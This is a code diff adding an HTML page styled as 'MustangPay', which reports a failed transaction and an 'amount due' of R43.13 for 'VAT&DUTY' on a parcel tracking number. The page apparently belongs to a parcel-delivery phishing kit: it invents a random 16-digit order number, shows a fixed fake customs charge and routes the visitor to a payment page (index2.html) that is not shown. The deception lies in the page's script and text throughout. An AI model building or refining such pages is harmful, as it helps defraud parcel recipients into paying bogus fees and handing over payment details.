@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MustangPay – Transaction Failed</title>
+<link rel="icon" href="img/MstgPay icon.png" type="image/jpeg">
+
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;font-family:"Segoe UI",Roboto,Arial,sans-serif;background:linear-gradient(180deg,#fff7ef,#fde7d6);display:flex;justify-content:center;align-items:center;}
+  .wrapper{width:100%;max-width:420px;padding:20px;text-align:center;}
+  .logo{display:flex;justify-content:center;align-items:center;margin-bottom:20px;}
+  .logo img{max-height:45px;width:auto;display:block;}
+  .card{background:#fff;border-radius:20px;padding:30px 20px;box-shadow:0 12px 30px rgba(0,0,0,.08);}
+  .error-icon{width:64px;height:64px;border-radius:50%;background:rgba(229,57,53,.12);display:flex;justify-content:center;align-items:center;margin:0 auto 16px;}
+  .error-icon span{width:32px;height:32px;background:#e53935;color:#fff;border-radius:50%;font-size:20px;font-weight:bold;display:flex;justify-content:center;align-items:center;}
+  h2{margin:10px 0;color:#e53935;font-size:22px;}
+  .amount{font-size:26px;font-weight:700;margin:10px 0;}
+  .details{text-align:left;font-size:14px;margin-bottom:25px;}
+  .details-row{display:flex;justify-content:space-between;padding:6px 0;gap:10px;}
+  .details-row span:first-child{color:#888}
+  .details-row span:last-child{font-weight:600;color:#000;word-break:break-all;text-align:right;}
+  .btn{width:100%;padding:14px;border:none;border-radius:30px;background:#000;color:#fff;font-size:16px;font-weight:600;cursor:pointer;}
+</style>
+</head>
+
+<body>
+<div class="wrapper">
+  <div class="logo">
+    <img src="img/MstgPay2.png" alt="MustangPay">
+  </div>
+  <div class="card">
+    <div class="error-icon"><span>!</span></div>
+    <h2>Amount due!</h2>
+    <div class="amount">R43.13</div>
+    <div class="details">
+      <div class="details-row">
+        <span>Order Number</span>
+        <span id="orderNum">—</span>
+      </div>
+      <div class="details-row">
+        <span>Remark</span>
+        <span id="remarkText">—</span>
+      </div>
+    </div>
+    <button class="btn" onclick="retry()">Pay R43.13</button>
+  </div>
+</div>
+
+<script>
+  let partCode = localStorage.getItem('trackingNumber');
+  const valid = partCode && /^BUFZA[A-Z0-9]{6,20}$/i.test(partCode);
+
+  function generateOrderNumber(){
+    let num = '';
+    for(let i=0;i<16;i++){
+      num += Math.floor(Math.random()*10);
+    }
+    return num;
+  }
+
+  if(!valid){
+    window.location.href = "index2.html";
+  } else {
+    partCode = partCode.toUpperCase();
+
+    const remark = partCode + "-VAT&DUTY";
+    const orderNum = generateOrderNumber();
+
+    document.getElementById('remarkText').textContent = remark;
+    document.getElementById('orderNum').textContent = orderNum;
+
+    // store for index2.html
+    localStorage.setItem('remark', remark);
+    localStorage.setItem('orderNumber', orderNum);
+  }
+
+  function retry(){
+    window.location.href = "index2.html";
+  }
+</script>
+</body>
+</html>
